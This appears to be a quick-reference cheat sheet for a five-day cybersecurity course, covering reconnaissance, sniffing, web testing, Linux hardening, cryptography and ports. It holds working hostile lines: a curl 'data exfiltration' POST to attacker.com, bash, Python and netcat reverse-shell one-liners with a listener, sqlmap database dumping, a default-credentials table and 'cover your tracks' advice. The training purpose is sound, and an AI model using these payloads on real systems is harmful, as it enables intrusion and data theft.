# Cybersecurity Quick Reference Guide
## Essential Commands & Tools for the 5-Day Course

---

## Part 1: Essential Commands Cheat Sheet

### Network Reconnaissance

```bash
# IP Information
hostname                    # Your computer name
ipconfig (Windows)          # Display IP configuration
ifconfig (Linux/Mac)        # Display network interfaces
ip addr (Linux)             # Show IP addresses

# DNS Enumeration
nslookup google.com         # Query DNS records
dig google.com              # Detailed DNS lookup
dig google.com MX           # Get mail servers
dig google.com NS           # Get name servers
whois google.com            # Domain registration info

# ICMP Connectivity
ping google.com             # Check if host is reachable
ping -c 4 google.com        # Linux: 4 packets
ping -n 4 google.com        # Windows: 4 packets

# Traceroute
tracert google.com          # Windows path to host
traceroute google.com       # Linux path to host

# Port Scanning
nmap google.com             # Basic scan
nmap -p 80,443 google.com   # Specific ports
nmap -p 1-1000 google.com   # Port range
nmap -sV google.com         # Service version detection
nmap -O google.com          # OS detection
nmap -A google.com          # Aggressive (all info)
nmap -p- google.com         # All 65535 ports

# ARP Scanning (Local Network)
arp -a                      # Show ARP table
arp -d                      # Clear ARP cache

# Netstat (Connections)
netstat -an                 # All connections
ss -tulpn                   # Listening ports (Linux)
netstat -tuln               # Listening ports (Linux alternative)
```

### Network Sniffing

```bash
# Tcpdump (Packet sniffer)
sudo tcpdump                # Capture all packets
sudo tcpdump -i eth0        # On specific interface
sudo tcpdump port 80        # Only port 80
sudo tcpdump src 192.168.1.1 # Specific source IP
sudo tcpdump -w capture.pcap # Save to file

# Wireshark (GUI packet analyzer)
wireshark                   # Start GUI
wireshark -i eth0           # Capture on interface
```

### Service Discovery

```bash
# Banner Grabbing
nc -v google.com 80         # Connect and grab banner
telnet google.com 80        # Telnet connection

# Service Enumeration
nmap -sV google.com         # Detect service versions
nmap --script=ssl-enum-ciphers google.com 443 # SSL ciphers
```

---

## Part 2: Web Application Security

### Web Vulnerability Testing

```bash
# SQLMap (SQL Injection testing)
sqlmap -u "http://target.com/search.php?q=1"
sqlmap -u "http://target.com/login" --data="user=admin&pass=1" -p pass
sqlmap -u "http://target.com/page?id=1" --dbs # Dump databases

# Burp Suite
# GUI tool - can't run from CLI but essential for:
# - Intercepting requests
# - XSS testing
# - SQL injection testing
# - Authentication testing

# OWASP ZAP (Command line)
zaproxy -cmd -quickurl http://target.com
```

### Curl Commands

```bash
# Basic requests
curl http://target.com      # GET request
curl -X POST http://target.com # POST request
curl -d "data=value" http://target.com # POST data

# Authentication
curl -u username:password http://target.com # Basic auth
curl -H "Authorization: Bearer TOKEN" http://target.com # Bearer token

# Headers
curl -H "User-Agent: Mozilla/5.0" http://target.com
curl -H "X-Custom-Header: value" http://target.com

# Data exfiltration
curl -X POST -d "name=John&age=30" http://attacker.com
```

---

## Part 3: Wireless Security

```bash
# WiFi Reconnaissance
iwconfig                    # Wireless interface info
airmon-ng                   # Monitor mode tools
ifconfig wlan0 down         # Disable WiFi
ifconfig wlan0 up           # Enable WiFi

# Packet Capture
tcpdump -i wlan0            # Capture on WiFi interface
airodump-ng wlan0mon        # Scan WiFi networks
```

---

## Part 4: Linux Hardening Commands

### User Management

```bash
# User Operations
useradd username            # Create user
userdel username            # Delete user
passwd username             # Change password
usermod -aG sudo username   # Add to sudo group
sudo -l                     # Show sudo permissions

# Password Policy
passwd -l username          # Lock account
passwd -u username          # Unlock account
passwd -e username          # Expire password
```

### Permissions & File Security

```bash
# File Permissions
chmod 755 file              # rwxr-xr-x
chmod 644 file              # rw-r--r--
chmod 600 file              # rw-------
chmod +x file               # Make executable

# Ownership
chown user:group file       # Change owner
chown -R user:group dir     # Recursive

# Special Permissions
chmod 4755 file             # SUID bit
chmod 2755 file             # SGID bit
chmod 1755 dir              # Sticky bit

# Immutable Files (can't be modified even by root)
sudo chattr +i /etc/passwd  # Make immutable
sudo chattr -i /etc/passwd  # Remove immutability
```

### SSH Security

```bash
# SSH Key Generation
ssh-keygen -t rsa -b 4096   # RSA 4096-bit
ssh-keygen -t ed25519       # Ed25519 (recommended)
ssh-copy-id user@server     # Copy key to server

# SSH Connection
ssh user@server             # Connect
ssh -i keyfile user@server  # Use specific key
ssh -p 2222 user@server     # Non-standard port

# SSH Config
~/.ssh/config               # Client config file
/etc/ssh/sshd_config        # Server config file

# Key Permissions
chmod 700 ~/.ssh            # SSH directory
chmod 600 ~/.ssh/id_rsa     # Private key
chmod 644 ~/.ssh/id_rsa.pub # Public key
chmod 600 ~/.ssh/authorized_keys
```

### Firewall Configuration (UFW)

```bash
# Enable/Disable
sudo ufw enable             # Start firewall
sudo ufw disable            # Stop firewall
sudo ufw reset              # Reset to defaults

# Rules
sudo ufw allow 22/tcp       # Allow SSH
sudo ufw allow 80/tcp       # Allow HTTP
sudo ufw allow 443/tcp      # Allow HTTPS
sudo ufw deny 23/tcp        # Block Telnet
sudo ufw allow from 192.168.1.0/24 to any port 3306 # Allow subnet to MySQL

# Status
sudo ufw status             # Show status
sudo ufw status verbose     # Detailed status
sudo ufw status numbered    # Numbered list

# Delete Rules
sudo ufw delete allow 22/tcp
sudo ufw delete 1           # Delete rule 1
```

### System Logging

```bash
# View Logs
tail -f /var/log/auth.log   # Follow auth log
tail -f /var/log/syslog     # Follow system log
grep "Failed password" /var/log/auth.log # Search logs

# Log Management
sudo systemctl restart rsyslog # Restart logging
logrotate                   # Rotate old logs
```

---

## Part 5: Cryptography Commands

### Hashing

```bash
# Calculate hashes
sha256sum file              # SHA256 hash
md5sum file                 # MD5 hash (not secure)
sha1sum file                # SHA1 hash (not secure)

# Verify integrity
sha256sum file > hash.txt
sha256sum -c hash.txt       # Verify against saved hash
```

### Encryption/Decryption

```bash
# OpenSSL encryption
openssl enc -aes-256-cbc -in file -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file

# Generate SSL certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
```

---

## Part 6: Python One-Liners

### Network Information

```python
# Get IP address
import socket; print(socket.gethostbyname('google.com'))

# Get hostname
import socket; print(socket.gethostname())

# DNS reverse lookup
import socket; print(socket.gethostbyaddr('8.8.8.8'))
```

### File Operations

```python
# Hash a file
import hashlib; print(hashlib.sha256(open('file', 'rb').read()).hexdigest())

# List files
import os; print(os.listdir('.'))

# Read file
print(open('file.txt').read())
```

### Web Requests

```python
# Simple GET request
import requests; print(requests.get('http://google.com').status_code)

# POST request with data
import requests; requests.post('http://target.com', data={'key': 'value'})
```

---

## Part 7: Important Ports to Remember

```
21    - FTP (File Transfer Protocol)
22    - SSH (Secure Shell)
23    - Telnet (unencrypted, don't use)
25    - SMTP (Email sending)
53    - DNS (Domain Name System)
80    - HTTP (Web)
110   - POP3 (Email receiving)
143   - IMAP (Email)
443   - HTTPS (Secure web)
445   - SMB (Windows file sharing)
3306  - MySQL Database
3389  - RDP (Remote Desktop)
5432  - PostgreSQL Database
5900  - VNC (Remote desktop)
6379  - Redis (In-memory database)
8080  - HTTP Alternative
8443  - HTTPS Alternative
9200  - Elasticsearch
27017 - MongoDB
```

---

## Part 8: Default Credentials List (Test Systems Only)

```
System          | Username      | Password
─────────────────────────────────────────
MySQL           | root          | (blank)
PostgreSQL      | postgres      | (blank)
MongoDB         | (none)        | (none)
Tomcat          | tomcat        | tomcat
Cisco Router    | admin         | admin
Windows         | Administrator | (blank)
Raspberry Pi    | pi            | raspberry
DVWA            | admin         | password
WebGoat         | admin         | admin123
```

⚠️ **WARNING**: Only use on authorized test systems!

---

## Part 9: CTF (Capture The Flag) Flags

Example CTF flag formats to recognize:

```
CTF{flag_content_here}
flag{your_flag_here}
FLAG{something_here}
picoCTF{flag}
ASIS{flag}
HTB{flag}
```

---

## Part 10: Exploit Development Quick Start

### Python Exploit Template

```python
#!/usr/bin/env python3

import socket
import sys
import time

def exploit(target_host, target_port):
    print(f"[*] Targeting {target_host}:{target_port}")
    
    try:
        # Connect to target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_host, target_port))
        print("[+] Connected!")
        
        # Send exploit
        payload = b"malicious_input"
        sock.send(payload)
        
        # Receive response
        response = sock.recv(1024)
        print(f"[+] Response: {response.decode()}")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    exploit(target_host, target_port)
```

---

## Part 11: Reverse Shell One-Liners

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Python Reverse Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### Nc Reverse Shell
```bash
nc 10.0.0.1 1234 -e /bin/bash
```

### Listener on Attacker
```bash
nc -lvnp 1234
```

---

## Part 12: Detection Evasion

### OPSEC (Operational Security) Best Practices

```
✓ Use VPN/Proxy
✓ Use separate VM/user account
✓ Don't connect personal accounts
✓ Use burner email addresses
✓ Clear browser history/cookies
✓ Use encrypted communications
✓ Don't mix identities
✓ Cover your tracks (if authorized)
✗ NEVER do unauthorized work
```

---

## Part 13: Debugging Failed Exploits

### Troubleshooting Checklist

```
□ Verify target is running
□ Check network connectivity
□ Confirm open ports
□ Verify service version
□ Check exploit requirements
□ Update exploit code
□ Try different payloads
□ Increase verbosity (-v or -vv)
□ Check firewall rules
□ Verify correct syntax
□ Test on lab system first
□ Read error messages carefully
□ Check for permission issues
□ Ensure required libraries installed
□ Test with different user privileges
□ Try alternative exploitation methods
```

---

## Part 14: Security Testing Priorities

### Critical (Test First - Max 24 hours to fix)
- Remote Code Execution (RCE)
- SQL Injection with data access
- Authentication bypass
- Privilege escalation
- Default credentials on critical systems

### High (Test Second - Max 7 days to fix)
- XSS in privileged areas
- Weak cryptography
- Missing authentication
- Broken authorization
- Information disclosure

### Medium (Test Third - Max 30 days to fix)
- Low-impact XSS
- Weak password policy
- Security misconfiguration
- Sensitive data in logs

### Low (Test Last - Max 90 days to fix)
- Typos in error messages
- Information in comments
- Weak password hints

---

## Part 15: Resources & Documentation

### Official Documentation
```
NIST Cybersecurity Framework
https://www.nist.gov/cyberframework

OWASP Testing Guide
https://owasp.org/www-project-web-security-testing-guide

CVE Database
https://cve.mitre.org

CWE List (Common Weakness Enumeration)
https://cwe.mitre.org

MITRE ATT&CK
https://attack.mitre.org
```

### Tool Documentation
```
Nmap Official: https://nmap.org
Metasploit: https://docs.rapid7.com/metasploit
Burp Suite: https://portswigger.net/burp
OWASP ZAP: https://www.zaproxy.org
```

---

## Quick Troubleshooting Table

| Problem | Solution |
|---------|----------|
| Port scan too slow | Increase threads with -T4 or -T5 |
| Connection refused | Check if service is running |
| Permission denied | Run with sudo or as different user |
| Command not found | Install package or check PATH |
| Timeout errors | Increase timeout value or network issues |
| Authentication failed | Verify credentials and protocol |
| Firewall blocking | Disable temporarily for testing |
| DNS not resolving | Use IP instead or check DNS server |
| Module not found | pip install required_module |
| Out of memory | Close other programs |

---

## Success Tips for the Course

✅ **DO:**
- Read all documentation carefully
- Run each command multiple times
- Understand output before moving on
- Take detailed notes
- Ask questions immediately
- Test in lab environment first
- Back up important files
- Keep learning after course

❌ **DON'T:**
- Skip lectures
- Copy-paste without understanding
- Test on production systems
- Use real credentials in labs
- Rush through exercises
- Ignore errors
- Leave systems vulnerable
- Share exploit code publicly

---

**Keep this guide handy throughout the 5-day training program!**

🛡️ **Good luck, future cybersecurity professional!** 🛡️
